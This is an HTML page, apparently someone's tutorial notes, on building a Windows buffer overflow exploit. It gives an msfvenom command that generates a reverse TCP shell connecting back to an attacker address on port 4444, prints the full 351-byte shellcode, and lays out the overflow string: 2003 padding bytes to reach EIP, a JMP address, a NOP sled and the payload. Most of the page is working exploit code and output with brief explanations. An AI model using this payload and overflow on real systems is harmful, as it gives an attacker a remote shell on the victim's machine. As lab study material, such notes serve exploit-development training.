<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Generating ShellCode and Getting Root</title>
</head><body>Use to msfvenom to generate shell code.<br/>
<br/>
We are having victim (192.168.66.1) connect back to us.<br/>
Command:<br/>
<b>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.224.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"<br/>
</b>EXITFUNC - to make program more stable<br/>
f - fileType. we are going to exploit in C<br/>
a - Architecture<br/>
-b - Bad Characters "\x00"<br/>
<br/>
Above command will generate below shell code: Payload size 351 bytes<br/>
<br/>
"\xb8\xd8\xe1\x45\xfb\xda\xc9\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"<br/>
"\x52\x83\xeb\xfc\x31\x43\x0e\x03\x9b\xef\xa7\x0e\xe7\x18\xa5"<br/>
"\xf1\x17\xd9\xca\x78\xf2\xe8\xca\x1f\x77\x5a\xfb\x54\xd5\x57"<br/>
"\x70\x38\xcd\xec\xf4\x95\xe2\x45\xb2\xc3\xcd\x56\xef\x30\x4c"<br/>
"\xd5\xf2\x64\xae\xe4\x3c\x79\xaf\x21\x20\x70\xfd\xfa\x2e\x27"<br/>
"\x11\x8e\x7b\xf4\x9a\xdc\x6a\x7c\x7f\x94\x8d\xad\x2e\xae\xd7"<br/>
"\x6d\xd1\x63\x6c\x24\xc9\x60\x49\xfe\x62\x52\x25\x01\xa2\xaa"<br/>
"\xc6\xae\x8b\x02\x35\xae\xcc\xa5\xa6\xc5\x24\xd6\x5b\xde\xf3"<br/>
"\xa4\x87\x6b\xe7\x0f\x43\xcb\xc3\xae\x80\x8a\x80\xbd\x6d\xd8"<br/>
"\xce\xa1\x70\x0d\x65\xdd\xf9\xb0\xa9\x57\xb9\x96\x6d\x33\x19"<br/>
"\xb6\x34\x99\xcc\xc7\x26\x42\xb0\x6d\x2d\x6f\xa5\x1f\x6c\xf8"<br/>
"\x0a\x12\x8e\xf8\x04\x25\xfd\xca\x8b\x9d\x69\x67\x43\x38\x6e"<br/>
"\x88\x7e\xfc\xe0\x77\x81\xfd\x29\xbc\xd5\xad\x41\x15\x56\x26"<br/>
"\x91\x9a\x83\xe9\xc1\x34\x7c\x4a\xb1\xf4\x2c\x22\xdb\xfa\x13"<br/>
"\x52\xe4\xd0\x3b\xf9\x1f\xb3\x83\x56\xff\xc3\x6c\xa5\xff\xd2"<br/>
"\x30\x20\x19\xbe\xd8\x64\xb2\x57\x40\x2d\x48\xc9\x8d\xfb\x35"<br/>
"\xc9\x06\x08\xca\x84\xee\x65\xd8\x71\x1f\x30\x82\xd4\x20\xee"<br/>
"\xaa\xbb\xb3\x75\x2a\xb5\xaf\x21\x7d\x92\x1e\x38\xeb\x0e\x38"<br/>
"\x92\x09\xd3\xdc\xdd\x89\x08\x1d\xe3\x10\xdc\x19\xc7\x02\x18"<br/>
"\xa1\x43\x76\xf4\xf4\x1d\x20\xb2\xae\xef\x9a\x6c\x1c\xa6\x4a"<br/>
"\xe8\x6e\x79\x0c\xf5\xba\x0f\xf0\x44\x13\x56\x0f\x68\xf3\x5e"<br/>
"\x68\x94\x63\xa0\xa3\x1c\x83\x43\x61\x69\x2c\xda\xe0\xd0\x31"<br/>
"\xdd\xdf\x17\x4c\x5e\xd5\xe7\xab\x7e\x9c\xe2\xf0\x38\x4d\x9f"<br/>
"\x69\xad\x71\x0c\x89\xe4"<br/>
<br/>
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow &nbsp; #625011af - Little Endian Format<br/>
<br/>
2003 bytes gets us to the EIP. <br/>
\xaf\x11\x50\x62 - This is the pointer address: the JMP Address<br/>
We are going to jump to the set of instructions that we provide. Above shellcode is the set of instructions<br/>
"\x90" * 32 are nops (Padding).<br/>
<br/>
<br/>
<br/>
&nbsp;</body></html>